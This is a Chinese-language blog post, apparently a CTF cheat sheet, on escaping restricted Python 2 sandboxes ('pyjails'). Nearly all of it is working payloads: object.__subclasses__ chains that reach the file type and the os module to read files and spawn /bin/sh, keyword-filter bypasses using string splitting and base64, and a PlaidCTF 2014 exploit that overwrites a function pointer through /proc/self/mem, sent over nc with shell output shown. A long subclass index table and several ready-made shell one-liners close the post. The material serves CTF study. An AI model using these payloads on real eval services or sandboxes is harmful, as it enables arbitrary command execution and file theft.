---
layout: post
title: Pyjail Tricks
date: 2015-07-26T03:31:50+00:00
comments: true
tags: [exploit, pyjail, python]
---

##实现

pyjail 实现方法主要有：

- 删除 \__builtins__ 中的方法
- 屏蔽关键字
- 删除 modules


----------

## object的subclasses方法

#### 1. 查看一个空列表的类属性
```python
>>> [].__class__
<type 'list'> 
```

#### 2. 取列表的父类，即object类
```python
>>> [].__class__.__base__
<type 'object'>
```

#### 3. 查看object的所有子类
```python
>>> [].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'> ... ]
```

#### 4. 可以看到其中有许多函数
例如file，我们可以利用它打开文件
首先得到file的下标

```python
>>> [].__class__.__base__.__subclasses__().index(file)
40
```

使用file

```python
>>> f = [].__class__.__base__.__subclasses__()[40]
>>> f('./test.txt').read()
'this is a secret message\n'
```  

#### 5. 取得os执行shell
为了得到os模块，我们要使用 warnings.catch_warnings 这个类

```python
>>> import warnings
>>> [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
59
```
查看 warnings.catch_warnings 中的函数

```python
>>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()
['filterwarnings', 'once_registry',...,'linecache',...]
```
查看 linecache

```python
>>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.keys()
['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']
```
其中有os模块，此时我们便可以使用

```python
>>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].system('/bin/sh')
```
现在我们取得了shell权限

----------

## 过滤字屏蔽

#### 1. 使用索引

```python
>>> a = [].__class__.__base__.__subclasses__()[59]
>>> b = a.__init__.func_globals['linecache'].__dict__.values()[12]
>>> s = b.__dict__.values()[137]
>>> s('whoami')
hexploitable  
0
```

#### 2. 使用未屏蔽的函数

```python
().__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].popen("/bin/sh >&2").read()
```
其中 >&2 重定向到stderr，当程序能显示返回错误时，我们即可得到shell执行结果

#### 3. 使用\__dict__

```python
print(().__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('/bin/sh'))
```

#### 4. 使用base64编码(如果base64模块未被过滤）

```python
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
```

```python
Putting it together:
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))
<module 'os' from '/usr/lib/python2.7/os.pyc'>
```

----------

## 技巧
如果题目给出了源代码，仔细查看，注意可用函数的性质及拓展

#### Example 1

```python
from __future__ import print_function
```
如果是python2.x，那么这句话代表我们可以使用python3.x的print，python3的print性质较2有所改变，不再作为一个关键字，而是一个函数

```python
>>> print
>>> from __future__ import print_function
>>> print
<built-in function print>

>>> print(().__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('/bin/sh'))
```

#### Example 2
From [PlaidCTF2014 Nightmare](https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/nightmares)

源代码

```python
#!/usr/bin/python -u
'''
You may wish to refer to solutions to the pCTF 2013 "pyjail" problem if
you choose to attempt this problem, BUT IT WON'T HELP HAHAHA.
'''

from imp import acquire_lock
from threading import Thread
from sys import modules, stdin, stdout

# No more importing!
x = Thread(target = acquire_lock, args = ())
x.start()
x.join()
del x
del acquire_lock
del Thread

# No more modules!
for k, v in modules.iteritems():
        if v == None: continue
        if k == '__main__': continue
        v.__dict__.clear()

del k, v

__main__ = modules['__main__']
modules.clear()
del modules

# No more anything!
del __builtins__, __doc__, __file__, __name__, __package__

print >> stdout, "Get a shell. The flag is NOT in ./key, ./flag, etc."
while 1:
        exec 'print >> stdout, ' + stdin.readline() in {'stdout':stdout}]
```

可以看到，代码基本去掉了所有的模块及函数，即使得到了os module,里面也没有可用的函数
仔细查看代码，发现可以使用stdout

```python
>>> from sys import stdout
>>> dir(stdout)
['__class__', '__delattr__', '__doc__', '__enter__', ...]
>>> stdout.__class__
<type 'file'>
>>> stdout.__class__('/etc/passwd', 'r').read()
'root:x:0:0:root:/root:/usr/bin/zsh\n
[...]
```

这时我们便可以读写任意我们可读写的文件

有两个关键文件:

- /proc/self/mem: 我们在其中读到 Python 的内存空间,我们可以重定向一个函数指针到 Python 对象描述表中
- /proc/self/maps: 我们可以看到 heap, libraries 和 stack 都是随机化的, 但 Python 的二进制文件的位置是固定的

我们可以通过分析二进制文件确定函数位置：

```python
>>> echo "stdout.__class__('/usr/bin/python2').read()" | nc 54.196.37.47 9990 > python2.out
>>> tail -n+1 python2.out > python
>>> objdump -R python2 | grep -E 'fopen|system'
00000000008582a0 R_X86_64_JUMP_SLOT  system
00000000008588c0 R_X86_64_JUMP_SLOT  fopen64
```

我们可以将 system 重定向到 fopen64

```python
(lambda r, w:
    r.seek(0x8582a0)
    or w.seek(0x8588c0)
    or w.write(r.read(8))
    or stdout.__class__('id, ls /home/nightmares_owner'))
    (stdout.__class__('/proc/self/mem','r'),
     stdout.__class__('/proc/self/mem','w',0))
```

最后执行获得shell

```python
% echo "(lambda r,w:r.seek(0x8582a0) or w.seek(0x8588c0) or w.write(r.read(8)) or stdout.__class__('id; ls /home/nightmares_owner'))(stdout.__class__('/proc/self/mem','r'), stdout.__class__('/proc/self/mem','w',0))" |  nc 54.196.37.47 9990
Get a shell. The flag is NOT in ./key, ./flag, etc.
None
uid=1002(nightmares_user) gid=1002(nightmares_user) groups=1002(nightmares_user)
total 36
drwxr-xr-x 2 nightmares_owner nightmares_owner 4096 Apr 10 14:16 .
drwxr-xr-x 4 root             root             4096 Apr 10 16:49 ..
-rw------- 1 nightmares_owner nightmares_owner  587 Apr 10 14:16 .bash_history
-rwsr-xr-x 1 nightmares_owner nightmares_owner 4236 Apr 10 14:12 give_me_the_flag.exe
-rw-r--r-- 1 nightmares_owner nightmares_owner  470 Apr 10 14:12 give_me_the_flag.exe.c
-rwxr-xr-x 1 nightmares_owner nightmares_owner  805 Apr 10 14:16 nightmares.py
-rwxr-xr-x 1 nightmares_owner nightmares_owner  122 Apr 10 15:00 problem_wrapper.sh
-r-------- 1 nightmares_owner nightmares_owner   33 Apr 10 14:07 use_exe_to_read_me.txt
sys.excepthook is missing
lost sys.stderr
```

----------
## 总结
windows7 下测试的 subclasses 有引用 os sys的模块及顺序

模块名称   py文件查找顺序

```python
1: weakref   weakref   UserDict   copy   types   sys
1: weakref   weakref   UserDict   copy   sys
1: weakref   weakref   UserDict   _abcoll   sys
10: traceback   traceback   linecache   sys
10: traceback   traceback   linecache   os
10: traceback   traceback   sys
10: traceback   traceback   types   sys
27: code   code   sys
27: code   code   traceback   linecache   sys
27: code   code   traceback   linecache   os
27: code   code   traceback   sys
27: code   code   traceback   types   sys
59: WarningMessage   warnings   linecache   sys
59: WarningMessage   warnings   linecache   os
59: WarningMessage   warnings   sys
59: WarningMessage   warnings   types   sys
59: WarningMessage   warnings   re   sys
59: WarningMessage   warnings   re   sre_compile   sys
59: WarningMessage   warnings   re   sre_compile   sre_parse   sys
60: catch_warnings   warnings   linecache   sys
60: catch_warnings   warnings   linecache   os
60: catch_warnings   warnings   sys
60: catch_warnings   warnings   types   sys
60: catch_warnings   warnings   re   sys
60: catch_warnings   warnings   re   sre_compile   sys
60: catch_warnings   warnings   re   sre_compile   sre_parse   sys
63: Hashable   _abcoll   abc   types   sys
63: Hashable   _abcoll   sys
65: Iterable   _abcoll   abc   types   sys
65: Iterable   _abcoll   sys
66: Sized   _abcoll   abc   types   sys
66: Sized   _abcoll   sys
67: Container   _abcoll   abc   types   sys
67: Container   _abcoll   sys
68: Callable   _abcoll   abc   types   sys
68: Callable   _abcoll   sys
69: _Printer   site   sys
69: _Printer   site   os
69: _Printer   site   traceback   linecache   sys
69: _Printer   site   traceback   linecache   os
69: _Printer   site   traceback   sys
69: _Printer   site   traceback   types   sys
69: _Printer   site   sysconfig   sys
69: _Printer   site   sysconfig   os
69: _Printer   site   sysconfig   re   sys
69: _Printer   site   sysconfig   re   sre_compile   sys
69: _Printer   site   sysconfig   re   sre_compile   sre_parse   sys
69: _Printer   site   sysconfig   pprint   warnings   sys
69: _Printer   site   sysconfig   pprint   StringIO   sys
69: _Printer   site   sysconfig   _osx_support   os
69: _Printer   site   sysconfig   _osx_support   sys
69: _Printer   site   sysconfig   _osx_support   contextlib   sys
69: _Printer   site   sysconfig   _osx_support   tempfile   random   os
69: _Printer   site   os
69: _Printer   site   pydoc   inspect   sys
69: _Printer   site   pydoc   inspect   os
69: _Printer   site   pydoc   inspect   dis   sys
69: _Printer   site   pydoc   inspect   tokenize   token   sys
69: _Printer   site   pydoc   inspect   tokenize   sys
69: _Printer   site   pydoc   inspect   collections   _abcoll   sys
69: _Printer   site   pydoc   inspect   collections   keyword   sys
69: _Printer   site   pydoc   inspect   collections   doctest   sys
69: _Printer   site   pydoc   inspect   collections   doctest   os
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   sys
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   cmd   sys
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   os
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   os
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   posixpath   os
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   posixpath   sys
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   posixpath   genericpath   os
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   bdb   sys
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   bdb   os
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   os
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   shlex   os
69: _Printer   site   pydoc   inspect   collections   doctest   pdb   shlex   sys
69: _Printer   site   pydoc   pkgutil   os
69: _Printer   site   pydoc   pkgutil   sys
69: _Printer   site   pydoc   pkgutil   os
69: _Printer   site   pydoc   sys
69: _Printer   site   pydoc   os
69: _Printer   site   pydoc   nturl2path   urllib   socket   os
69: _Printer   site   pydoc   nturl2path   urllib   socket   sys
69: _Printer   site   pydoc   nturl2path   urllib   os
69: _Printer   site   pydoc   nturl2path   urllib   sys
69: _Printer   site   pydoc   nturl2path   urllib   base64   sys
69: _Printer   site   pydoc   nturl2path   urllib   base64   getopt   os
69: _Printer   site   pydoc   nturl2path   urllib   base64   getopt   sys
69: _Printer   site   pydoc   nturl2path   urllib   httplib   os
69: _Printer   site   pydoc   nturl2path   urllib   httplib   sys
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   os
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   sys
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   rfc822   sys
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   rfc822   os
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   quopri   sys
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   os
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   sys
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   sys
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   os
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   locale   sys
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   locale   os
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   sys
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   copy   sys
69: _Printer   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   os
69: _Printer   site   pydoc   nturl2path   urllib   mimetypes   os
69: _Printer   site   pydoc   nturl2path   urllib   mimetypes   sys
69: _Printer   site   pydoc   nturl2path   urllib   ftplib   os
69: _Printer   site   pydoc   nturl2path   urllib   ftplib   sys
69: _Printer   site   pydoc   nturl2path   urllib   getpass   os
69: _Printer   site   pydoc   nturl2path   urllib   getpass   sys
69: _Printer   site   pydoc   nturl2path   urllib   getpass   os
69: _Printer   site   pydoc   formatter   sys
69: _Printer   site   pydoc   BaseHTTPServer   sys
69: _Printer   site   pydoc   BaseHTTPServer   SocketServer   sys
69: _Printer   site   pydoc   BaseHTTPServer   SocketServer   os
69: _Printer   site   pydoc   webbrowser   os
69: _Printer   site   pydoc   webbrowser   sys
69: _Printer   site   pydoc   webbrowser   subprocess   sys
69: _Printer   site   pydoc   webbrowser   subprocess   os
69: _Printer   site   pydoc   webbrowser   subprocess   pickle   sys
69: _Printer   site   pydoc   webbrowser   glob   sys
69: _Printer   site   pydoc   webbrowser   glob   os
69: _Printer   site   codecs   sys
70: _Helper   site   sys
70: _Helper   site   os
70: _Helper   site   traceback   linecache   sys
70: _Helper   site   traceback   linecache   os
70: _Helper   site   traceback   sys
70: _Helper   site   traceback   types   sys
70: _Helper   site   sysconfig   sys
70: _Helper   site   sysconfig   os
70: _Helper   site   sysconfig   re   sys
70: _Helper   site   sysconfig   re   sre_compile   sys
70: _Helper   site   sysconfig   re   sre_compile   sre_parse   sys
70: _Helper   site   sysconfig   pprint   warnings   sys
70: _Helper   site   sysconfig   pprint   StringIO   sys
70: _Helper   site   sysconfig   _osx_support   os
70: _Helper   site   sysconfig   _osx_support   sys
70: _Helper   site   sysconfig   _osx_support   contextlib   sys
70: _Helper   site   sysconfig   _osx_support   tempfile   random   os
70: _Helper   site   os
70: _Helper   site   pydoc   inspect   sys
70: _Helper   site   pydoc   inspect   os
70: _Helper   site   pydoc   inspect   dis   sys
70: _Helper   site   pydoc   inspect   tokenize   token   sys
70: _Helper   site   pydoc   inspect   tokenize   sys
70: _Helper   site   pydoc   inspect   collections   _abcoll   sys
70: _Helper   site   pydoc   inspect   collections   keyword   sys
70: _Helper   site   pydoc   inspect   collections   doctest   sys
70: _Helper   site   pydoc   inspect   collections   doctest   os
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   sys
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   cmd   sys
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   os
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   os
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   posixpath   os
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   posixpath   sys
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   posixpath   genericpath   os
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   bdb   sys
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   bdb   os
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   os
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   shlex   os
70: _Helper   site   pydoc   inspect   collections   doctest   pdb   shlex   sys
70: _Helper   site   pydoc   pkgutil   os
70: _Helper   site   pydoc   pkgutil   sys
70: _Helper   site   pydoc   pkgutil   os
70: _Helper   site   pydoc   sys
70: _Helper   site   pydoc   os
70: _Helper   site   pydoc   nturl2path   urllib   socket   os
70: _Helper   site   pydoc   nturl2path   urllib   socket   sys
70: _Helper   site   pydoc   nturl2path   urllib   os
70: _Helper   site   pydoc   nturl2path   urllib   sys
70: _Helper   site   pydoc   nturl2path   urllib   base64   sys
70: _Helper   site   pydoc   nturl2path   urllib   base64   getopt   os
70: _Helper   site   pydoc   nturl2path   urllib   base64   getopt   sys
70: _Helper   site   pydoc   nturl2path   urllib   httplib   os
70: _Helper   site   pydoc   nturl2path   urllib   httplib   sys
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   os
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   sys
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   rfc822   sys
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   rfc822   os
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   quopri   sys
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   os
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   sys
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   sys
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   os
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   locale   sys
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   locale   os
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   sys
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   copy   sys
70: _Helper   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   os
70: _Helper   site   pydoc   nturl2path   urllib   mimetypes   os
70: _Helper   site   pydoc   nturl2path   urllib   mimetypes   sys
70: _Helper   site   pydoc   nturl2path   urllib   ftplib   os
70: _Helper   site   pydoc   nturl2path   urllib   ftplib   sys
70: _Helper   site   pydoc   nturl2path   urllib   getpass   os
70: _Helper   site   pydoc   nturl2path   urllib   getpass   sys
70: _Helper   site   pydoc   nturl2path   urllib   getpass   os
70: _Helper   site   pydoc   formatter   sys
70: _Helper   site   pydoc   BaseHTTPServer   sys
70: _Helper   site   pydoc   BaseHTTPServer   SocketServer   sys
70: _Helper   site   pydoc   BaseHTTPServer   SocketServer   os
70: _Helper   site   pydoc   webbrowser   os
70: _Helper   site   pydoc   webbrowser   sys
70: _Helper   site   pydoc   webbrowser   subprocess   sys
70: _Helper   site   pydoc   webbrowser   subprocess   os
70: _Helper   site   pydoc   webbrowser   subprocess   pickle   sys
70: _Helper   site   pydoc   webbrowser   glob   sys
70: _Helper   site   pydoc   webbrowser   glob   os
70: _Helper   site   codecs   sys
74: Quitter   site   sys
74: Quitter   site   os
74: Quitter   site   traceback   linecache   sys
74: Quitter   site   traceback   linecache   os
74: Quitter   site   traceback   sys
74: Quitter   site   traceback   types   sys
74: Quitter   site   sysconfig   sys
74: Quitter   site   sysconfig   os
74: Quitter   site   sysconfig   re   sys
74: Quitter   site   sysconfig   re   sre_compile   sys
74: Quitter   site   sysconfig   re   sre_compile   sre_parse   sys
74: Quitter   site   sysconfig   pprint   warnings   sys
74: Quitter   site   sysconfig   pprint   StringIO   sys
74: Quitter   site   sysconfig   _osx_support   os
74: Quitter   site   sysconfig   _osx_support   sys
74: Quitter   site   sysconfig   _osx_support   contextlib   sys
74: Quitter   site   sysconfig   _osx_support   tempfile   random   os
74: Quitter   site   os
74: Quitter   site   pydoc   inspect   sys
74: Quitter   site   pydoc   inspect   os
74: Quitter   site   pydoc   inspect   dis   sys
74: Quitter   site   pydoc   inspect   tokenize   token   sys
74: Quitter   site   pydoc   inspect   tokenize   sys
74: Quitter   site   pydoc   inspect   collections   _abcoll   sys
74: Quitter   site   pydoc   inspect   collections   keyword   sys
74: Quitter   site   pydoc   inspect   collections   doctest   sys
74: Quitter   site   pydoc   inspect   collections   doctest   os
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   sys
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   cmd   sys
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   os
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   os
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   posixpath   os
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   posixpath   sys
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   bdb   fnmatch   posixpath   genericpath   os
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   bdb   sys
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   bdb   os
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   os
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   shlex   os
74: Quitter   site   pydoc   inspect   collections   doctest   pdb   shlex   sys
74: Quitter   site   pydoc   pkgutil   os
74: Quitter   site   pydoc   pkgutil   sys
74: Quitter   site   pydoc   pkgutil   os
74: Quitter   site   pydoc   sys
74: Quitter   site   pydoc   os
74: Quitter   site   pydoc   nturl2path   urllib   socket   os
74: Quitter   site   pydoc   nturl2path   urllib   socket   sys
74: Quitter   site   pydoc   nturl2path   urllib   os
74: Quitter   site   pydoc   nturl2path   urllib   sys
74: Quitter   site   pydoc   nturl2path   urllib   base64   sys
74: Quitter   site   pydoc   nturl2path   urllib   base64   getopt   os
74: Quitter   site   pydoc   nturl2path   urllib   base64   getopt   sys
74: Quitter   site   pydoc   nturl2path   urllib   httplib   os
74: Quitter   site   pydoc   nturl2path   urllib   httplib   sys
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   os
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   sys
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   rfc822   sys
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   rfc822   os
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   quopri   sys
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   os
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   sys
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   sys
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   os
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   locale   sys
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   locale   os
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   sys
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   copy   sys
74: Quitter   site   pydoc   nturl2path   urllib   httplib   mimetools   uu   optparse   gettext   os
74: Quitter   site   pydoc   nturl2path   urllib   mimetypes   os
74: Quitter   site   pydoc   nturl2path   urllib   mimetypes   sys
74: Quitter   site   pydoc   nturl2path   urllib   ftplib   os
74: Quitter   site   pydoc   nturl2path   urllib   ftplib   sys
74: Quitter   site   pydoc   nturl2path   urllib   getpass   os
74: Quitter   site   pydoc   nturl2path   urllib   getpass   sys
74: Quitter   site   pydoc   nturl2path   urllib   getpass   os
74: Quitter   site   pydoc   formatter   sys
74: Quitter   site   pydoc   BaseHTTPServer   sys
74: Quitter   site   pydoc   BaseHTTPServer   SocketServer   sys
74: Quitter   site   pydoc   BaseHTTPServer   SocketServer   os
74: Quitter   site   pydoc   webbrowser   os
74: Quitter   site   pydoc   webbrowser   sys
74: Quitter   site   pydoc   webbrowser   subprocess   sys
74: Quitter   site   pydoc   webbrowser   subprocess   os
74: Quitter   site   pydoc   webbrowser   subprocess   pickle   sys
74: Quitter   site   pydoc   webbrowser   glob   sys
74: Quitter   site   pydoc   webbrowser   glob   os
74: Quitter   site   codecs   sys
75: IncrementalEncoder   codecs   sys
76: IncrementalDecoder   codecs   sys
```

调用 os 的一些方法：
#### 1. subclasses 为 class, 调用os:
```
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0].__init__.func_globals['linecache'].__dict__['os'].system('/bin/sh')
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'WarningMessage'][0].__init__.func_globals['linecache'].__dict__['os'].system('/bin/sh')
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == '_Printer'][0].__init__.func_globals['os'].system('/bin/sh')
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == '_Helper'][0].__init__.func_globals['os'].system('/bin/sh')
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Quitter'][0].__init__.func_globals['os'].system('/bin/sh')
```
#### 2. 通过 sys 调用 os:
```
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0].__init__.func_globals['sys'].modules['os'].system('/bin/sh')
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'WarningMessage'][0].__init__.func_globals['sys'].modules['os'].system('/bin/sh')
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'IncrementalEncoder'][0].__init__.func_globals['sys'].modules['os'].system('/bin/sh')
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'IncrementalDecoder'][0].__init__.func_globals['sys'].modules['os'].system('/bin/sh')
```
#### 3. 通过 inspect 的 getmodule 来调用(需要 import inspect):
实验对象： sys.flag等

```python
inspect.getmodule(object.__subclasses__()[51]).modules['os'].system("/bin/sh")
```
----------

## 参考

[CSAW-CTF Python sandbox write-up](https://hexplo.it/escaping-the-csawctf-python-sandbox/)

[Escaping Python Sandboxes](https://hexplo.it/escaping-the-csawctf-python-sandbox/)

[PlaidCTF 2014 nightmares (Pwnables 375) Writeup](http://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/)

[Exploiting Python’s Eval](http://www.floyd.ch/?p=584)

[plaidCTF 2013 "pyjail" Writeup - Part I: Breaking the Sandbox](https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html)
